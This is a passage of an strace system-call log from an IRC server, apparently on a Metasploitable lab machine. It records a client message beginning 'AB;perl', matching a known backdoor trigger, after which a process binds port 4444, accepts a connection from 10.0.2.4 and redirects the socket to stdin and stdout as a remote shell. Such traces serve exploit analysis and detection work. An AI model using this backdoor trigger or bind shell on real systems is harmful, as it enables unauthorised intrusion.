Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
5353  07:08:43.670806 close(10)         = 0
5353  07:08:43.670816 munmap(0xb7d8b000, 4096) = 0
5353  07:08:43.670843 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 10
5353  07:08:43.670865 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2f6d8) = -1 EINVAL (Invalid argument)
5353  07:08:43.670879 _llseek(10, 0, 0xbfd2f720, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5353  07:08:43.670891 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2f6d8) = -1 EINVAL (Invalid argument)
5353  07:08:43.670901 _llseek(10, 0, 0xbfd2f720, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5353  07:08:43.670911 fcntl64(10, F_SETFD, FD_CLOEXEC) = 0
5353  07:08:43.670964 setsockopt(10, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
5353  07:08:43.671033 bind(10, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
5353  07:08:43.671059 listen(10, 5)     = 0
5353  07:08:43.671112 accept(10,  <unfinished ...>
5352  07:08:43.671334 exit_group(0)     = ?
5350  07:08:43.671406 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 5352
5350  07:08:43.671421 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5350  07:08:43.671432 --- SIGCHLD (Child exited) @ 0 (0) ---
5350  07:08:43.671439 waitpid(-1, 0xbf9a8d18, WNOHANG) = -1 ECHILD (No child processes)
5350  07:08:43.671450 sigreturn()       = ? (mask now [])
5350  07:08:43.671520 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
5350  07:08:43.671578 exit_group(0)     = ?
4519  07:08:43.671616 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 5350
4519  07:08:43.671628 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:08:43.671641 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:08:43.671652 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:08:43.671662 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:08:43.671680 send(8, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:08:43.671764 time(NULL)        = 1495624123
4519  07:08:43.671775 time(NULL)        = 1495624123
4519  07:08:43.671823 gettimeofday({1495624123, 671827}, NULL) = 0
4519  07:08:43.671837 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:08:43.671868 clock_gettime(CLOCK_MONOTONIC, {933, 488881617}) = 0
4519  07:08:43.671881 gettimeofday({1495624123, 671885}, NULL) = 0
4519  07:08:43.671892 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 980000})
4519  07:08:43.683297 clock_gettime(CLOCK_MONOTONIC, {933, 500318861}) = 0
4519  07:08:43.683327 recv(9, "PRIVMSG  #testit3 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  07:08:43.683357 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683375 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683389 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683403 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683417 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683430 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683444 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683463 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683476 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683490 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683503 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683516 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683530 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683543 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683556 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683570 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683583 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683596 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683610 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683625 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683653 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683694 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.683713 gettimeofday({1495624123, 683732}, NULL) = 0
4519  07:08:43.683740 select(1024, [2 3 4 5 6 7 8 9], [], NULL, {1, 0} <unfinished ...>
5353  07:08:43.837624 <... accept resumed> {sa_family=AF_INET, sin_port=htons(34147), sin_addr=inet_addr("10.0.2.4")}, [16]) = 11
5353  07:08:43.837682 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2e6c8) = -1 EINVAL (Invalid argument)
5353  07:08:43.837712 _llseek(11, 0, 0xbfd2e710, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5353  07:08:43.837724 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2e6c8) = -1 EINVAL (Invalid argument)
5353  07:08:43.837749 _llseek(11, 0, 0xbfd2e710, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5353  07:08:43.837773 fcntl64(11, F_SETFD, FD_CLOEXEC) = 0
5353  07:08:43.837866 close(10)         = 0
5353  07:08:43.837951 dup(11)           = 10
5353  07:08:43.837984 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2f568) = -1 EINVAL (Invalid argument)
5353  07:08:43.838121 _llseek(10, 0, 0xbfd2f5b0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5353  07:08:43.838134 fstat64(10, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
5353  07:08:43.838156 dup2(10, 1)       = 1
5353  07:08:43.838176 close(10)         = 0
5353  07:08:43.838193 fcntl64(1, F_SETFD, 0) = 0
5353  07:08:43.838208 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2f538) = -1 EINVAL (Invalid argument)
5353  07:08:43.838224 _llseek(1, 0, 0xbfd2f580, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5353  07:08:43.838281 dup(11)           = 10
5353  07:08:43.838301 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2f568) = -1 EINVAL (Invalid argument)
5353  07:08:43.838317 _llseek(10, 0, 0xbfd2f5b0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5353  07:08:43.838361 fstat64(10, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
5353  07:08:43.838380 dup2(10, 0)       = 0
5353  07:08:43.838406 close(10)         = 0
5353  07:08:43.838416 fcntl64(0, F_SETFD, 0) = 0
5353  07:08:43.838432 fcntl64(0, F_SETFD, 0) = 0
5353  07:08:43.838449 read(0,  <unfinished ...>
4519  07:08:43.839166 <... select resumed> ) = 1 (in [8], left {0, 850000})
4519  07:08:43.839195 clock_gettime(CLOCK_MONOTONIC, {933, 656209484}) = 0
4519  07:08:43.839225 recv(8, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:08:43.839239 getsockopt(8, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:08:43.839260 send(8, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:08:43.839276 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:08:43.839312 close(8)          = 0
4519  07:08:43.839326 time(NULL)        = 1495624123
4519  07:08:43.839335 time(NULL)        = 1495624123
4519  07:08:43.839347 gettimeofday({1495624123, 839350}, NULL) = 0
4519  07:08:43.839365 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:08:43.839394 clock_gettime(CLOCK_MONOTONIC, {933, 656407191}) = 0
4519  07:08:43.839405 gettimeofday({1495624123, 839408}, NULL) = 0
4519  07:08:43.839415 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 780000})
4519  07:08:44.053305 clock_gettime(CLOCK_MONOTONIC, {933, 870331669}) = 0
4519  07:08:44.053341 recv(7, "PRIVMSG  #testit2 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  07:08:44.053375 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053394 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053409 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053423 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053436 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053450 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053463 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053477 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053490 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053504 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053517 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053530 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053543 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053557 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053570 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053584 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053633 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053683 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053715 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053730 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053743 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053770 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:44.053819 gettimeofday({1495624124, 53824}, NULL) = 0
4519  07:08:44.053849 select(1024, [2 3 4 5 6 7 9], [5], NULL, {1, 0}) = 1 (out [5], left {1, 0})
4519  07:08:44.053916 clock_gettime(CLOCK_MONOTONIC, {933, 870928775}) = 0
4519  07:08:44.053928 send(5, ":bot3!bot3@Test-CAD1B1ED PRIVMSG #testit2 :Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\r\n", 81, 0) = 81
4519  07:08:44.053969 time(NULL)        = 1495624124
4519  07:08:44.053980 time(NULL)        = 1495624124
4519  07:08:44.053999 gettimeofday({1495624124, 54004}, NULL) = 0
4519  07:08:44.054011 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:08:44.054039 clock_gettime(CLOCK_MONOTONIC, {933, 871051987}) = 0
4519  07:08:44.054049 gettimeofday({1495624124, 54053}, NULL) = 0
4519  07:08:44.054059 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
5353  07:08:44.366316 <... read resumed> "", 4096) = 0
5353  07:08:44.366464 close(11)         = 0
5353  07:08:44.366610 exit_group(0)     = ?
